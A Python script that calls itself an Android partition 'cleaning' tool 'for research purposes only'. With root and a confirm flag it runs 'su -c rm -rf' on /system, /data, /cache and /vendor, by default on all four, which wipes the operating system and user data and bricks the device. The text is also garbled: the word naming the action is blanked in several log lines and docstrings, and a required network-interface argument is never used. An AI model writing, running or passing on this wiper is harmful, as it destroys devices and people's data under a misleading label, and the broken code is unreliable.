#!/usr/bin/env python3
import argparse
import os
import sys
import logging
from typing import List

# Configure logging for transparency
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('clean.log')
    ]
)
logger = logging.getLogger(__name__)

def is_root() -> bool:
    """Check if the script is running with root privileges."""
    return os.geteuid() == 0

def display_partitions_info() -> None:
    """Display information about Android partitions."""
    logger.info("🔍 Displaying partition information:")
    partitions = {
        "/system": "Contains Android OS core files",
        "/data": "Stores user data and applications",
        "/cache": "Stores system cache",
        "/vendor": "Contains manufacturer-specific files"
    }
    for path, desc in partitions.items():
        logger.info(f"- {path}: {desc}")

def execute_cleaning(partitions: List[str]) -> None:
    """Execute  of specified partitions using su."""
    if not is_root():
        logger.error("❌ Root privileges required to execute this command!")
        sys.exit(1)

    logger.info("🚨 Starting partition  process...")
    for partition in partitions:
        if not os.path.exists(partition):
            logger.warning(f"⚠️ Partition {partition} does not exist, skipping...")
            continue

        logger.info(f"[+]  partition {partition}...")
        try:
            # Use su to execute rm command
            os.system(f"su -c 'rm -rf {partition}/*' || true")
            logger.info(f"[✅] Successfully  {partition}")
        except Exception as e:
            logger.error(f"[❌] Failed {partition}: {str(e)}")

    logger.info("[✅]  completed.")

def main() -> None:
    """Main function to parse arguments and control script flow."""
    parser = argparse.ArgumentParser(
        description="Android Partition - For research purposes only",
        epilog="Use with caution on test devices only!"
    )
    parser.add_argument("-i", "--interface", required=True, help="Network interface (e.g., wlan0)")
    parser.add_argument("-K", "--confirm", action="store_true", help="Confirm execution of ")
    parser.add_argument("-s", "--system", action="store_true", help="Clean /system partition")
    parser.add_argument("-d", "--data", action="store_true", help="Clean /data partition")
    parser.add_argument("-c", "--cache", action="store_true", help="Clean /cache partition")
    parser.add_argument("-v", "--vendor", action="store_true", help="Clean /vendor partition")

    args = parser.parse_args()

    # If -K is not provided, show partition info and exit
    if not args.confirm:
        display_partitions_info()
        logger.info("No  initiated. Use -K to proceed with .")
        sys.exit(0)

    # Collect selected partitions (default to all if none specified)
    partitions = []
    if args.system:
        partitions.append("/system")
    if args.data:
        partitions.append("/data")
    if args.cache:
        partitions.append("/cache")
    if args.vendor:
        partitions.append("/vendor")

    # If no partitions selected, clean all by default
    if not partitions:
        partitions = ["/system", "/data", "/cache", "/vendor"]

    execute_cleaning(partitions)

if __name__ == "__main__":
    main()
